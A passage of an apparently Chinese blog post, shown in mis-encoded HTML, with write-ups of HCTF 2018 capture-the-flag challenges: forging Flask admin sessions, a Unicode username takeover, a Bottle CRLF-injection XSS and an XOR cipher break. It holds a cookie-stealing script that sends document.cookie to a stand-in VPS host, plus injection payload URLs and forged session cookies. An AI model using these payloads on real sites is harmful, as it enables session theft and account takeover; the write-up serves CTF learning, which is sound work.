class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>æœä¸€ä¸‹ uuid.getnode()ï¼Œå°±å¯ä»¥çŸ¥é“è¿™æ˜¯è¿”å›ä¸»æœºçš„ mac åœ°å€ï¼ˆåè¿›åˆ¶ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæƒ³ä¼ªé€  sessionï¼Œå…ˆè¦è¯»ä¸€ä¸‹ mac åœ°å€ï¼Œè·¯å¾„ï¼š<code>/sys/class/net/eth0/addressc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12:34:3e:14:7c:62</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›´æ¥ python ç”Ÿæˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="string">&quot;12343e147c62&quot;</span>,<span class="number">16</span>))</span><br><span class="line">print(<span class="built_in">str</span>(random.random()*<span class="number">100</span>))</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œè¦ç”¨ python3ï¼Œpython2 å’Œ python3 ç”Ÿæˆçš„ç»“æœä¸åŒï¼Œè¯» python ç‰ˆæœ¬å·å¯çŸ¥æ˜¯ python3ï¼Œä¹Ÿå¯ä»¥ä¸¤ä¸ªéƒ½è¯•ä¸€ä¸‹ã€‚</p><p>å¾—åˆ°ç»“æœï¼š <strong>11.935137566861131</strong></p><p>ç„¶åæœ‰äº† SECRET_KEYï¼Œæ‹¿åˆ°ç®¡ç†å‘˜çš„ session ï¼Œè¿™é‡Œè¯´ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p><h4 id="æœ¬åœ°è¿è¡Œæ‹¿-session"><a href="#æœ¬åœ°è¿è¡Œæ‹¿-session" class="headerlink" title="æœ¬åœ°è¿è¡Œæ‹¿ session"></a>æœ¬åœ°è¿è¡Œæ‹¿ session</h4><p>ä»£ç é‡Œå¦‚æœ admin ç™»å½•å°±è·³è½¬ï¼Œæˆ‘ä»¬å¯ä»¥æœ¬åœ°æŠŠä»£ç è¿™éƒ¨åˆ†æ”¹æ‰ï¼Œç„¶å admin ç™»å½•æ‹¿ sessionï¼Œæ³¨æ„è¿˜è¦æŠŠ key æ”¹äº†ï¼Œå¦‚æœä¸æ”¹å°±æŒ‰ç…§è‡ªå·±ä¸»æœºçš„ mac åœ°å€ç”Ÿæˆäº†ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-e5e23a31d005766f.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7b00c128354c8751.png" alt="1542086603892.png"></p><p>æˆ‘æ”¹äº†ä¸ªprint(1) </p><p>è¿è¡Œ main.py,è®¿é—® <a href="http://127.0.0.1:10008/">http://127.0.0.1:10008/</a> ç›´æ¥ç™»å½• adminï¼ˆè¦ä»¿ç…§æœåŠ¡å™¨é‚£è¾¹æ”¾ä¸ª flag.py ä¿è¯æ­£å¸¸ç™»å½•ï¼‰</p><p>æ‹¿ cookieï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c07bda3aadb01284.png" alt="image.png"></p><p>ç„¶åå¸¦ç€è¿™ä¸ª cookie å»è®¿é—®é¢˜ç›®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a40abfb778640ddf.png" alt="image.png"></p><p>å¾—åˆ° flagï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0823ab97becca896.png" alt="image.png"></p><h4 id="ç›´æ¥ä¼ªé€ -session"><a href="#ç›´æ¥ä¼ªé€ -session" class="headerlink" title="ç›´æ¥ä¼ªé€  session"></a>ç›´æ¥ä¼ªé€  session</h4><p>ç°åœ¨æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº† seesion çš„ SECRET_KEYï¼Œå¯ä»¥å€ŸåŠ©å·¥å…·ç›´æ¥ç”Ÿæˆ Flask çš„ sessionï¼Œå·¥å…·åœ°å€ï¼š</p><p><code>https://github.com/noraj/flask-session-cookie-manager</code></p><p>é¦–å…ˆæˆ‘ä»¬é¦–å…ˆä»»æ„ç™»ä¸€ä¸ªç”¨æˆ·ï¼Œè§£å¯†ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py decode -c &quot;eyJ1c2VybmFtZSI6ImdtbCJ9.DsvdsA.L4_AQuRKz_33D-JBWPEOdipSQTM&quot; -s &quot;11.935137566861131&quot;</span><br><span class="line">&#123;u&#39;username&#39;: u&#39;gml&#39;&#125;</span><br></pre></td></tr></table></figure><p>æŠŠåå­—æ”¹ä¸º adminï¼Œç”Ÿæˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -t &quot;&#123;u&#39;username&#39;: u&#39;admin&#39;&#125;&quot; -s &quot;11.935137566861131&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.W-pMzA._Zbk3AcYcydsgX3W43l2ZQfD06I</span><br></pre></td></tr></table></figure><p>æ‹¿è¿™ä¸ª session ä¹Ÿå¯ä»¥å¾—åˆ° flagã€‚</p><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="è§£æ³•ä¸€ã€unicodeç¼–ç ç»•è¿‡"><a href="#è§£æ³•ä¸€ã€unicodeç¼–ç ç»•è¿‡" class="headerlink" title="è§£æ³•ä¸€ã€unicodeç¼–ç ç»•è¿‡"></a>è§£æ³•ä¸€ã€unicodeç¼–ç ç»•è¿‡</h4><p>ä¿®æ”¹å¯†ç çš„æºä»£ç æœ‰githubçš„åœ°å€ï¼Œæºç æ³„éœ²ï¼š </p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7e3f2e1daad9c4ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>ä¸‹è½½åˆ°æºç ï¼Œå‘ç°åœ¨æ³¨å†Œå’Œæ”¹å¯†ç éƒ½åŒ…å«æœ‰ä¸€ä¸ª <code>strlower</code> çš„å¤„ç†:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-e8aab53a97319335.png" alt="image.png"></p><p>è·Ÿä¸€ä¸‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-631f89dbb4c7342f.png" alt="image.png"></p><p>è¿™é‡Œä¸¤æ¬¡è¿›è¡Œå°å†™è½¬æ¢å¯ä»¥è¶Šæƒä¿®æ”¹ admin çš„å¯†ç ï¼Œè¯¦ç»†å¯è§ <a href="http://blog.lnyas.xyz/?p=1411">è¿™ç¯‡</a></p><p>æŒ‰ç…§æ€è·¯ï¼Œå…ˆæ³¨å†Œä¸€ä¸ª á´¬dminï¼Œç„¶åç™»å½•ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-419f45ad3d020c15.png" alt="image.png"></p><p>ç»è¿‡<code>strlower</code> ï¼Œå‘ç°å·²ç»å˜æˆäº†æ­£å¸¸çš„å¤§å†™çš„ Aã€‚</p><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹å¯†ç ï¼Œå†ç”¨ admin å’Œä¿®æ”¹åçš„å¯†ç è¿›è¡Œç™»å½•ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3f86da732a795a37.png" alt="image.png"></p><p>æˆåŠŸç™»å…¥ adminã€‚</p><h4 id="è§£æ³•äºŒã€ä¼ªé€ -session"><a href="#è§£æ³•äºŒã€ä¼ªé€ -session" class="headerlink" title="è§£æ³•äºŒã€ä¼ªé€  session"></a>è§£æ³•äºŒã€ä¼ªé€  session</h4><p>å’Œä¸Šé¢çš„ handandseek å‡ ä¹ä¸€æ ·ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸¤ç§æ–¹æ³•ç”Ÿæˆ sessionã€‚</p><h5 id="å·¥å…·ç”Ÿæˆï¼š"><a href="#å·¥å…·ç”Ÿæˆï¼š" class="headerlink" title="å·¥å…·ç”Ÿæˆï¼š"></a>å·¥å…·ç”Ÿæˆï¼š</h5><p>è¯¦æƒ…è§ handandseek çš„è¿‡ç¨‹ï¼Œæ‹¿åˆ°æ™®é€šç”¨æˆ·çš„ session -&gt; è§£å¯† -&gt; ç”¨æˆ·åæ”¹ä¸º admin -&gt; ç™»å½•</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¦ç”¨ python3 ç”Ÿæˆï¼Œ2 å’Œ 3 æœ‰äº›å·®å¼‚ï¼Œpython2 ç™»ä¸è¿›å»ã€‚</p><p>æˆ‘ç”¨ python3 ä¹Ÿæœ‰æ—¶å€™ç™»çš„ä¸Šæœ‰æ—¶å€™ç™»ä¸ä¸Šâ€¦ å¾ˆè¿·ï¼Œå¤šè¯•å‡ æ¬¡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> py -3 session_cookie_manager.py decode -c &quot;.eJw9kE2LgzAQhv_KMmcPGk1dCz0U1OJCpghxQ3KR1I31K13QFqml_31tD3t8n_dhmJkHlPVopga21_FmHCjbH9g-4OMEW0CuOuTFXRLmYtxTZVWv-GBRYI-WzYrvKePVLEkeyKXyVTy0SLBXIid4yGf2cklBUXz37JAEuKy-zWYUhS9XpkRyZzZtMd4HyqYNi9HKRVJJMh8X1WL3teacIkmbI5cB49mihGqkTahc0uEYY8fEi7MdPB2oprEur7-9uazLU127rh96mhovCmu3DrWvK2PCz4hEG6IranRUVxtwoLX6bP6v5glmMt-9J160XQs422HVbpMZ3-8Bz4XnH8pzYho.W-pkDw.8VHOyWfjrgVGMKOpjxyK3Q4UPq4&quot; -s &quot;ckj123&quot;</span><br><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;56c552cc4499ffde9f5cd6c0e09170cd8c77d9b7cded64d019f7e95ed0a87092b05e7aedea22ab408faa03fc69cb776b62fc497aa968123efaba9c1e83c1f813&#39;, &#39;csrf_token&#39;: &#39;5af00371a5e197f0f7a3acee7892962ac5ea9fc6&#39;, &#39;image&#39;: b&#39;LCHa&#39;, &#39;name&#39;: &#39;gml&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -3 session_cookie_manager.py encode -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;56c552cc4499ffde9f5cd6c0e09170cd8c77d9b7cded64d019f7e95ed0a87092b05e7aedea22ab408faa03fc69cb776b62fc497aa968123efaba9c1e83c1f813&#39;, &#39;csrf_token&#39;: &#39;5af00371a5e197f0f7a3acee7892962ac5ea9fc6&#39;, &#39;image&#39;: b&#39;LCHa&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot; -s &quot;ckj123&quot;</span><br><span class="line">.eJw9kE2LgzAQhv_KMmcPGk1dhR4KanEhU4R0Q3KR1Mb1Ky7YFqml_31tD3t8n_dhmJkHlPVkLg3E1-lmHCjbM8QP-DhBDMhVh_x4l4S5mPRUWdUrPlgU2KNls-I7yng1S1IEcql8lQwtEuyVKAjui5m9XHKkKL57tk8DXFbf5jOKoy9XpkR6ZzZrMdkFymYNS9DKRVJJch8X1WL3teaCIsmaA5cB4_mihGqkTalcsuGQYMfEi7MtPB2oLlNdXn97M67LU127rh96mhovCmu3DrWvK2PCz4hEG6IranRUVxtwoLX6x_xfzVPMZbF9Txy1XQvQZ9uOq3i7mOn9IPBceP4Bk15i4w.W-pzdQ.PJAuINlsKAVYWnmZLp7QUJFIiNI</span><br></pre></td></tr></table></figure><p>ç„¶åå¸¦ç€ session å»è®¿é—® <a href="http://admin.2018.hctf.io/index">http://admin.2018.hctf.io/index</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-55bfbfaac1c37ecb.png" alt="image.png"></p><h5 id="æœ¬åœ°ç”Ÿæˆ"><a href="#æœ¬åœ°ç”Ÿæˆ" class="headerlink" title="æœ¬åœ°ç”Ÿæˆ"></a>æœ¬åœ°ç”Ÿæˆ</h5><p>æœ¬åœ°æ­ç¯å¢ƒç™»å½• admin è·å– sessionã€‚</p><h4 id="è§£æ³•ä¸‰ã€æ¡ä»¶ç«äº‰"><a href="#è§£æ³•ä¸‰ã€æ¡ä»¶ç«äº‰" class="headerlink" title="è§£æ³•ä¸‰ã€æ¡ä»¶ç«äº‰"></a>è§£æ³•ä¸‰ã€æ¡ä»¶ç«äº‰</h4><p>è¿™ä¸ªæœ‰å¸ˆå‚…åˆ©ç”¨æ¡ä»¶ç«äº‰æˆåŠŸç™»å…¥ admin çš„ï¼Œè§è¿™ç¯‡ï¼š</p><p><a href="https://gist.github.com/dotsu123/7e479ad93c62c9632a97dbb9bb119681">https://gist.github.com/dotsu123/7e479ad93c62c9632a97dbb9bb119681</a></p><p>ä¸è¿‡æˆ‘æ²¡æœ‰å¤ç°æˆåŠŸã€‚ã€‚ã€‚</p><h4 id="è§£æ³•å››ã€è«åå…¶å¦™æ‹¿-flag"><a href="#è§£æ³•å››ã€è«åå…¶å¦™æ‹¿-flag" class="headerlink" title="è§£æ³•å››ã€è«åå…¶å¦™æ‹¿ flag"></a>è§£æ³•å››ã€è«åå…¶å¦™æ‹¿ flag</h4><p>å¬å¤©æ¢çš„å¸ˆå‚…è¯´è¿™ä¸ªé¢˜æœ‰ä¸ªå¥‡æ€ªçš„ bugâ€¦ å¤©æ¢ wp çš„é“¾æ¥ <a href="https://xz.aliyun.com/t/3256#toc-4">https://xz.aliyun.com/t/3256#toc-4</a></p><p>è¿™é¢˜è¿™ä¹ˆå¤šè§£æ³•çœŸæ˜¯å¯ä»¥2333ã€‚</p><h3 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h3><p>ç™»è¿›å»æ˜¯ä¸‹é¢çš„é¡µé¢ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a780dd32f0ef065b.png" alt="image.png"></p><p>å¾ˆåƒæ˜¯ xssï¼Œå‘ç°æœ‰ä¸ª 302 è·³è½¬ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-120a29c797c2b375.png" alt="image.png"></p><p>å‚è€ƒ pç¥çš„æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p><p>ä½¿ç”¨ &lt;80 çš„ç«¯å£ç»•è¿‡ 302ã€‚ç›´æ¥æ‰“ cookieï¼Œç”¨ VPS å’Œ xss å¹³å°éƒ½å¯ä»¥ã€‚</p><p>éªŒè¯ç å¯ä»¥ç”¨ä¸‹é¢è„šæœ¬è·‘å‡ºæ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">1000000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(substr(md5($i),<span class="number">0</span>,<span class="number">4</span>) == <span class="string">&quot;95fa&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>VPS</strong>ï¼š</p><p>åœ¨æˆ‘çš„ VPS ä¸Šæ”¾ä¸ª cookie.jsï¼Œå†…å®¹ä¸ºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keep=<span class="keyword">new</span> Image(); keep.src=<span class="string">&#x27;http://vps_address:2333?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨é¢˜ç›® url å¡«å…¥ä¸‹é¢ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;user%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;vps&#x2F;cookie.js%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>éªŒè¯ç çˆ†ç ´ï¼Œç„¶åæäº¤ï¼Œåœ¨ vps ä¸Šç›‘å¬ 2333ç«¯å£ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6fdc5501f03ed049.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d7ac91566e24bcdb.png" alt="image.png"></p><p>ç”¨æ‰“æ¥çš„ cookie: <code>410e34187a19486dbdd6532fbb44af70</code> è®¿é—®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-e9721c0ed7910c2e.png" alt="image.png"></p><p>ç”¨ <strong>xss</strong> å¹³å°ï¼š</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;user%0d%0a%0d%0a%3Cscript%20src&#x3D;https:&#x2F;&#x2F;xss.pt&#x2F;WqMR%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-b6d0783047f0c4d1.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xor-game"><a href="#xor-game" class="headerlink" title="xor_game"></a>xor_game</h3><p>å…¸å‹çš„é‡å¤å¯†é’¥å¼‚æˆ–ï¼Œä¹‹å‰ Bside åšè¿‡ä¸€ä¸ªç±»ä¼¼çš„ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯å¥—ç”¨ä¸Šæ¬¡çš„æ€è·¯ã€‚</p><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>æˆ‘ä»¬å…ˆå‡è®¾ key æœ‰10ä½ï¼Œé‚£ä¹ˆæ˜æ–‡ç¬¬ 1 ä½ä¸å¯†æ–‡ç¬¬ 1 ä½å¼‚æˆ–çš„ç»“æœä¸€å®šç­‰äºæ˜æ–‡ç¬¬11ä½ä¸å¯†æ–‡ç¬¬11ä½å¼‚æˆ–çš„ç»“æœï¼Œå› ä¸ºç»“æœå°±æ˜¯ key çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ˜æ–‡çš„ç¬¬ 1 ä½å’Œç¬¬ 11 ä½è¿›è¡Œçˆ†ç ´ï¼Œå½“ä»–ä»¬ä¸å„è‡ªä½ç½®çš„å¯†æ–‡å¼‚æˆ–çš„ç»“æœç›¸ç­‰ï¼Œå°±è¯´æ˜å¼‚æˆ–çš„ç»“æœæ˜¯ key ç¬¬ä¸€ä½çš„ä¸€ä¸ª<strong>å¯èƒ½å€¼</strong>ã€‚åˆ©ç”¨ç¬¬ä¸€ä½å’Œç¬¬åä¸€ä½ï¼Œåº”è¯¥ä¼šå¾—åˆ°ä¸æ­¢ä¸€ä¸ª key ç¬¬ä¸€ä½çš„å¯èƒ½å€¼ã€‚å†åŒç†çˆ† 11 ä½å’Œ 21 ä½ï¼Œç¬¬ 21 ä½ å’Œç¬¬ 22 ä½ â€¦â€¦æœ€åå„ä¸ªç»„çš„å¯èƒ½å€¼å–äº¤é›†ï¼Œå°±æœ‰<strong>å¾ˆå¤§å¯èƒ½</strong>æ˜¯ key çš„ç¬¬ä¸€ä½ã€‚</p><p>å½“ç„¶æˆ‘ä»¬ä¸çŸ¥é“ key çš„ä½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•ï¼Œçœ‹çˆ†å‡ºçš„ key å“ªä¸ªåƒæ˜¯ flagï¼Œå› ä¸º flag æ˜¯å¯è§å­—ç¬¦å¹¶ä¸”å¯ä»¥è¾¨è®¤ã€‚</p><p>å› ä¸ºæˆ‘ä»¬æœ‰è¶³å¤Ÿå¤šçš„ç»„ï¼Œæ‰€ä»¥æœ‰å¾ˆå°å‡ ç‡å–äº¤é›†å‰©ä¸‹æœ‰å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå¾ˆæ£˜æ‰‹çš„é—®é¢˜ï¼Œå°±æ˜¯çˆ†ç ´æ˜æ–‡çš„æ—¶å€™ï¼Œçˆ†ç ´çš„å­—å…¸é€‰å–ã€‚</p><p>è¿™ä¸ªå­—å…¸ï¼Œå¦‚æœé€‰æ‹©æ‰€æœ‰å¯è§å­—ç¬¦ï¼Œé‚£ä¹ˆç¡®å®æ¯ä¸€ä½æœ€åéƒ½ä¼šçˆ†å‡ºå¾ˆå¤šä¸ªç»“æœâ€¦ è¿™é“é¢˜è¯´æ˜æ–‡æ˜¯ä¸€é¦–è¯—ï¼Œæ‰€ä»¥æˆ‘èƒ½æƒ³åˆ°çš„å­—ç¬¦é›†æ˜¯<code>å¤§å°å†™å­—æ¯+æ•°å­—+ç©ºæ ¼ã€æ¢è¡Œ+æ ‡ç‚¹ç¬¦å·</code>ã€‚è¿™ä¸ªå­—å…¸é€‰å–å¦‚æœè¿‡å¤§ï¼Œä¼šçˆ†å‡ºå¾ˆå¤šç»“æœï¼›å¦‚æœå­—å…¸é€‰å–è¿‡å°ï¼Œæ˜æ–‡ä¸­æœ‰äº›å­—ç¬¦æ²¡æœ‰åœ¨å­—å…¸ä¸­ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°éƒ¨åˆ† key çš„ä½æ•°çˆ†ä¸å‡ºæ¥çš„æƒ…å†µã€‚</p><h4 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><p>åœ¨åšè¿™ä¸ªé¢˜æ—¶ï¼Œæˆ‘å…ˆ<strong>å°½é‡å‹ä½</strong>äº†å­—å…¸çš„å¤§å°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>=string.ascii_letters+string.digits+<span class="string">&quot;.?!&#x27;\&quot;,;: &quot;</span>+<span class="built_in">chr</span>(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>ä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>=string.ascii_letters+string.digits+<span class="string">&quot;.?!&#x27;\&quot;,;: &quot;</span>+<span class="built_in">chr</span>(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cipher.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher=base64.b64decode(f.read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    key = (key * (<span class="built_in">len</span>(data) / <span class="built_in">len</span>(key) + <span class="number">1</span>))[:<span class="built_in">len</span>(data)]</span><br><span class="line">    <span class="keyword">return</span> strxor(data, key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span>(<span class="params">i,j</span>):</span></span><br><span class="line">    <span class="built_in">list</span>=[]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(a) ^ <span class="built_in">ord</span>(cipher[i]) == <span class="built_in">ord</span>(b) ^ <span class="built_in">ord</span>(cipher[j]) :</span><br><span class="line">                <span class="built_in">list</span>.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a) ^ <span class="built_in">ord</span>(cipher[i])))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    key_len = a</span><br><span class="line">    group = <span class="built_in">len</span>(cipher) / key_len   <span class="comment">#ç»„æ•°</span></span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        k = getkey(<span class="number">0</span> * key_len + i, <span class="number">1</span> * key_len + i)    <span class="comment">#ç¬¬ä¸€ç»„</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, group - <span class="number">1</span>):</span><br><span class="line">            k = k &amp; getkey(j * key_len + i, j * key_len + key_len + i)     <span class="comment">#æ¯æ¬¡å–äº¤é›†</span></span><br><span class="line">        key += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(k))</span><br><span class="line">    <span class="built_in">print</span> key_len,<span class="string">&quot;:&quot;</span>+key</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f1682c697ecb66e3.png" alt="image.png"></p><p>å¯ä»¥åˆ¤æ–­ key åº”è¯¥ä¸º 21 ä½ï¼Œè€Œè¿™ä¸ªç»“æœæ‰ 17 ä½ï¼Œç¦»çœŸæ­£çš„ key è¿˜å·®ä¸€äº›ã€‚</p><p>å¾ˆå®¹æ˜“è¡¥é½å‰é¢å·®çš„ <code>x</code> å’Œåé¢çš„ <code>g</code>ï¼Œä½†æ˜¯è¿˜æ˜¯å·®ä¸¤ä¸¤ä½ï¼ŒçŒœæµ‹å­—å…¸å¯èƒ½å°äº†ï¼Œæ‰€ä»¥ä¸æ–­è¯•ç€é€æ¸å¢å¤§å­—å…¸ï¼Œç»ˆäºæœ€åæ‰¾åˆ°äº†åˆé€‚çš„å­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>=string.ascii_letters+string.digits+<span class="string">&quot;.?!&#x27;\&quot;,;: ()-&quot;</span>+<span class="built_in">chr</span>(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>æœ€åè·‘å‡ºæ¥ flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor_is_interesting!@#</span><br></pre></td></tr></table></figure><p>å›é¡¾æˆ‘çš„æ€è·¯ï¼Œæœ€å¤§çš„é—®é¢˜æ˜¯å­—å…¸çš„é€‰å–ã€‚æˆ‘åœ¨çˆ†æ¯ä¸€ä½çš„æ—¶å€™ï¼Œå–äº¤é›†çš„ç»„æ•°æ˜¯ 